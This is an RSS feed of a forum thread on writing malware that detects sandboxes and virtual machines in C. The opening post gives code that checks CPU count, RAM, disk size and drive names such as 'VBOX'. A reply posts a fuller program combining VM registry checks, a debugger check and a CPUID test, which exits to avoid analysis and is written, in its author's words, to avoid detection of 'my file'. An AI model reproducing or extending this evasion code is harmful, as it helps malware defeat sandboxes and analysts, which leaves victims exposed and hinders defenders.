<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Malware development | anti-sandbox | anti-VM techniques in c</title>
    <link>https://0x00sec.org/t/malware-development-anti-sandbox-anti-vm-techniques-in-c/39326</link>
    <description>malware development | anti-sandbox | anti-VM techniques in c

video out now but thanks for subscribing 
https://www.youtube.com/channel/UC88YVlKcrgL4-PRDPOuFDbg



Analyzing a malwareapp dynamically

Dynamic analysis of an executable may be performed either automatically by a sandbox or manually by a malware  analyst. Malicious applications often use various methods to finger print the environment they’re being executed in and perform different actions based on a given execution environment situation.

Automated analysis is performed in a simplified sandbox environment which may have some specific traits;  particularly it may not be able to emulate all execution nuances of  a real environment. 


Both automated and manual analysis have common characteristics, in particular they are usually performed in virtual environments which can be easily detected if not configured properly.

Most sandbox detection techniques revolve around checking specific environment attributes

Example
limited resources, indicative device names  artifacts ,presence of specific files, registry keys

Detecting virtual environments

Both sandboxes and analyst’s virtual Operating Systems usually can’t 100% emulate actual execution environment like typical user workstations). Virtual environments have limited resources ,corresponding device names whch  can also provide useful information, may have VM-specific tools and drivers installed, often look like  fresh Windows installations and sometimes use hardcoded user or computer names. 


Hardware resources information retrieval
sandboxes /VM boxes used by analysts are  subjected  to some constraints - they often have limited resources.

Typical user workstation have  processors with at least 2 cores, a minimum of 2 GB of RAM and a 100 GB hard drive space. We can verify if the environment our malicious application is being executed in is a subject to these constrains:

// check CPU
SYSTEM_INFO systemInfo;
GetSystemInfo(&amp;systemInfo);
DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
if (numberOfProcessors &lt; 2) return false;



// check RAM
MEMORYSTATUSEX memoryStatus;
memoryStatus.dwLength = sizeof(memoryStatus);
GlobalMemoryStatusEx(&amp;memoryStatus);
DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
if (RAMMB &lt; 2048) return false;

// check HDD

HANDLE hDevice = CreateFileW(L&quot;\\\\.\\PhysicalDrive0&quot;, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

DISK_GEOMETRY pDiskGeometry;

DWORD bytesReturned;

DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0,&amp;pDiskGeometry, sizeof(pDiskGeometry), &amp;bytesReturned, (LPOVERLAPPED)NULL);

DWORD diskSizeGB;

diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;

if (diskSizeGB &lt; 100) return false;


Devices and vendor names

On default VM installations, devices often have predictable names, for example containing strings associated with the specific hypervisor. We can check for hard drive name, optical disk drive name, BIOS version, computer manufacturer and model name, graphics controller name etc. Relevant information can be retrieved with WMI queries (check properties like “Name”, “Description”, “Caption”).

Below you can see an example of HDD name retrieval using native Windows API functions (without WMI):

HDEVINFO hDeviceInfo = SetupDiGetClassDevs(&amp;GUID_DEVCLASS_DISKDRIVE, 0, 0, DIGCF_PRESENT);

SP_DEVINFO_DATA deviceInfoData;

deviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);

SetupDiEnumDeviceInfo(hDeviceInfo, 0, &amp;deviceInfoData);

DWORD propertyBufferSize;

SetupDiGetDeviceRegistryPropertyW(hDeviceInfo, &amp;deviceInfoData, SPDRP_FRIENDLYNAME, NULL, NULL, 0, &amp;propertyBufferSize);

PWSTR HDDName = (PWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, propertyBufferSize);SetupDiGetDeviceRegistryPropertyW(hDeviceInfo, &amp;deviceInfoData, SPDRP_FRIENDLYNAME, NULL, (PBYTE)HDDName, propertyBufferSize, NULL);

CharUpperW(HDDName);

if (wcsstr(HDDName, L&quot;VBOX&quot;)) return false;</description>
    
    <lastBuildDate>Thu, 07 Mar 2024 02:52:34 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/malware-development-anti-sandbox-anti-vm-techniques-in-c/39326.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Malware development | anti-sandbox | anti-VM techniques in c</title>
        <dc:creator><![CDATA[blc_chef]]></dc:creator>
        <description><![CDATA[
            <p>wow this is cool men thansks alot</p>
          <p><a href="https://0x00sec.org/t/malware-development-anti-sandbox-anti-vm-techniques-in-c/39326/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-anti-sandbox-anti-vm-techniques-in-c/39326/3</link>
        <pubDate>Sun, 03 Mar 2024 21:23:03 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-39326-3</guid>
        <source url="https://0x00sec.org/t/malware-development-anti-sandbox-anti-vm-techniques-in-c/39326.rss">Malware development | anti-sandbox | anti-VM techniques in c</source>
      </item>
      <item>
        <title>Malware development | anti-sandbox | anti-VM techniques in c</title>
        <dc:creator><![CDATA[E1.Coders]]></dc:creator>
        <description><![CDATA[
            <p><strong>This is a sample code that I wrote to increase the rate of non-recognition of my file</strong></p>
<pre><code class="lang-auto"># © Code By E1.Coders
#include &lt;windows.h&gt;
#include &lt;winreg.h&gt;
#include &lt;stdio.h&gt;

bool is_sandboxed() {
    HDEVINFO hDeviceInfo = SetupDiGetClassDevs(&amp;GUID_DEVCLASS_DISKDRIVE, NULL, NULL, DIGCF_PRESENT | DIGCF_DEVICEINTERFACE);
    if (hDeviceInfo == INVALID_HANDLE_VALUE) {
        return false;
    }

    SP_DEVICE_INTERFACE_DATA deviceInterfaceData;
    deviceInterfaceData.cbSize = sizeof(SP_DEVICE_INTERFACE_DATA);

    for (int i = 0; SetupDiEnumDeviceInterfaces(hDeviceInfo, NULL, &amp;GUID_DEVCLASS_DISKDRIVE, i, &amp;deviceInterfaceData); i++) {
        DWORD dwRegKeySize = 0;
        SetupDiGetDeviceRegistryProperty(hDeviceInfo, &amp;deviceInterfaceData, SPDRP_REGISTRYKEY, NULL, NULL, 0, &amp;dwRegKeySize);

        if (dwRegKeySize &gt; 0) {
            wchar_t* pDeviceRegistryKey = (wchar_t*)malloc(dwRegKeySize);
            SetupDiGetDeviceRegistryProperty(hDeviceInfo, &amp;deviceInterfaceData, SPDRP_REGISTRYKEY, NULL, (PBYTE)pDeviceRegistryKey, dwRegKeySize, NULL);

            HKEY hKey;
            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, pDeviceRegistryKey, 0, KEY_READ, &amp;hKey) == ERROR_SUCCESS) {
                wchar_t path[MAX_PATH];
                if (RegQueryValueExW(hKey, L"Parent", NULL, NULL, (LPBYTE)path, NULL) == ERROR_SUCCESS) {
                    if (_wcsstr(path, L"VMWare") || _wcsstr(path, L"VirtualBox")) {
                        free(pDeviceRegistryKey);
                        RegCloseKey(hKey);
                        SetupDiDestroyDeviceInfoList(hDeviceInfo);
                        return true;
                    }
                }

                RegCloseKey(hKey);
            }

            free(pDeviceRegistryKey);
        }
    }

    SetupDiDestroyDeviceInfoList(hDeviceInfo);
    return false;
}

bool is_debugger_present() {
    return IsDebuggerPresent();
}

bool is_virtualized() {
    bool is_virtualized = false;

    // Check for virtualized CPUID function
    __try {
        __asm {
            mov eax, 0x80000001
            cpuid
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        is_virtualized = true;
    }

    // Check for hypervisor-specific indicators
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", 0, KEY_READ, &amp;hKey) == ERROR_SUCCESS) {
        wchar_t vendor[0x40];
        DWORD size = sizeof(vendor);
        RegQueryValueExW(hKey, L"VendorIdentifier", NULL, NULL, (LPBYTE)vendor, &amp;size);

        if (_wcsstr(vendor, L"VMware") || _wcsstr(vendor, L"VirtualBox") || _wcsstr(vendor, L"QEMU")) {
            is_virtualized = true;
        }

        RegCloseKey(hKey);
    }

    return is_virtualized;
}

int main() {
    if (is_sandboxed() || is_debugger_present() || is_virtualized()) {
        // Prevent analysis by exiting
        exit(0);
    }

    // Rest of the code
    return 0;
}


</code></pre>
          <p><a href="https://0x00sec.org/t/malware-development-anti-sandbox-anti-vm-techniques-in-c/39326/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-anti-sandbox-anti-vm-techniques-in-c/39326/2</link>
        <pubDate>Sat, 02 Mar 2024 10:18:30 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-39326-2</guid>
        <source url="https://0x00sec.org/t/malware-development-anti-sandbox-anti-vm-techniques-in-c/39326.rss">Malware development | anti-sandbox | anti-VM techniques in c</source>
      </item>
      <item>
        <title>Malware development | anti-sandbox | anti-VM techniques in c</title>
        <dc:creator><![CDATA[blc_chef]]></dc:creator>
        <description><![CDATA[
            <p>malware development | anti-sandbox | anti-VM techniques in c</p>
<p>video out now but thanks for subscribing</p><aside class="onebox allowlistedgeneric" data-onebox-src="https://www.youtube.com/channel/UC88YVlKcrgL4-PRDPOuFDbg">
  <header class="source">
      <img src="https://www.youtube.com/s/desktop/fe730087/img/favicon.ico" class="site-icon" width="16" height="16">

      <a href="https://www.youtube.com/channel/UC88YVlKcrgL4-PRDPOuFDbg" target="_blank" rel="noopener nofollow ugc">YouTube</a>
  </header>

  <article class="onebox-body">
    <img src="https://yt3.googleusercontent.com/zMeNKZunaI4ML_acQo1UW-qYDMmBIrIkRl4sxTb_aiPk_d5vnFyGiPMzakSXubw7QZzlKNPmtg=s900-c-k-c0x00ffffff-no-rj" class="thumbnail onebox-avatar" width="500" height="500">

<h3><a href="https://www.youtube.com/channel/UC88YVlKcrgL4-PRDPOuFDbg" target="_blank" rel="noopener nofollow ugc">lnl training consult</a></h3>

  <p>Welcome to our YouTube channel, where we offer an extensive range of courses focused on malware development, reverse engineering, low-level security, programming, and much more. Our channel is dedicated to providing top-rated educational content that...</p>


  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

<p>Analyzing a malwareapp dynamically</p>
<p>Dynamic analysis of an executable may be performed either automatically by a sandbox or manually by a malware  analyst. Malicious applications often use various methods to finger print the environment they’re being executed in and perform different actions based on a given execution environment situation.</p>
<p>Automated analysis is performed in a simplified sandbox environment which may have some specific traits;  particularly it may not be able to emulate all execution nuances of  a real environment.</p>
<p>Both automated and manual analysis have common characteristics, in particular they are usually performed in virtual environments which can be easily detected if not configured properly.</p>
<p>Most sandbox detection techniques revolve around checking specific environment attributes</p>
<p>Example<br>
limited resources, indicative device names  artifacts ,presence of specific files, registry keys</p>
<p>Detecting virtual environments</p>
<p>Both sandboxes and analyst’s virtual Operating Systems usually can’t 100% emulate actual execution environment like typical user workstations). Virtual environments have limited resources ,corresponding device names whch  can also provide useful information, may have VM-specific tools and drivers installed, often look like  fresh Windows installations and sometimes use hardcoded user or computer names.</p>
<p>Hardware resources information retrieval<br>
sandboxes /VM boxes used by analysts are  subjected  to some constraints - they often have limited resources.</p>
<p>Typical user workstation have  processors with at least 2 cores, a minimum of 2 GB of RAM and a 100 GB hard drive space. We can verify if the environment our malicious application is being executed in is a subject to these constrains:</p>
<p>// check CPU<br>
SYSTEM_INFO systemInfo;<br>
GetSystemInfo(&amp;systemInfo);<br>
DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;<br>
if (numberOfProcessors &lt; 2) return false;</p>
<p>// check RAM<br>
MEMORYSTATUSEX memoryStatus;<br>
memoryStatus.dwLength = sizeof(memoryStatus);<br>
GlobalMemoryStatusEx(&amp;memoryStatus);<br>
DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;<br>
if (RAMMB &lt; 2048) return false;</p>
<p>// check HDD</p>
<p>HANDLE hDevice = CreateFileW(L"\\.\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);</p>
<p>DISK_GEOMETRY pDiskGeometry;</p>
<p>DWORD bytesReturned;</p>
<p>DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0,&amp;pDiskGeometry, sizeof(pDiskGeometry), &amp;bytesReturned, (LPOVERLAPPED)NULL);</p>
<p>DWORD diskSizeGB;</p>
<p>diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;</p>
<p>if (diskSizeGB &lt; 100) return false;</p>
<p>Devices and vendor names</p>
<p>On default VM installations, devices often have predictable names, for example containing strings associated with the specific hypervisor. We can check for hard drive name, optical disk drive name, BIOS version, computer manufacturer and model name, graphics controller name etc. Relevant information can be retrieved with WMI queries (check properties like “Name”, “Description”, “Caption”).</p>
<p>Below you can see an example of HDD name retrieval using native Windows API functions (without WMI):</p>
<p>HDEVINFO hDeviceInfo = SetupDiGetClassDevs(&amp;GUID_DEVCLASS_DISKDRIVE, 0, 0, DIGCF_PRESENT);</p>
<p>SP_DEVINFO_DATA deviceInfoData;</p>
<p>deviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);</p>
<p>SetupDiEnumDeviceInfo(hDeviceInfo, 0, &amp;deviceInfoData);</p>
<p>DWORD propertyBufferSize;</p>
<p>SetupDiGetDeviceRegistryPropertyW(hDeviceInfo, &amp;deviceInfoData, SPDRP_FRIENDLYNAME, NULL, NULL, 0, &amp;propertyBufferSize);</p>
<p>PWSTR HDDName = (PWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, propertyBufferSize);SetupDiGetDeviceRegistryPropertyW(hDeviceInfo, &amp;deviceInfoData, SPDRP_FRIENDLYNAME, NULL, (PBYTE)HDDName, propertyBufferSize, NULL);</p>
<p>CharUpperW(HDDName);</p>
<p>if (wcsstr(HDDName, L"VBOX")) return false;</p>
          <p><a href="https://0x00sec.org/t/malware-development-anti-sandbox-anti-vm-techniques-in-c/39326/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-anti-sandbox-anti-vm-techniques-in-c/39326/1</link>
        <pubDate>Thu, 29 Feb 2024 23:32:54 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-39326-1</guid>
        <source url="https://0x00sec.org/t/malware-development-anti-sandbox-anti-vm-techniques-in-c/39326.rss">Malware development | anti-sandbox | anti-VM techniques in c</source>
      </item>
  </channel>
</rss>
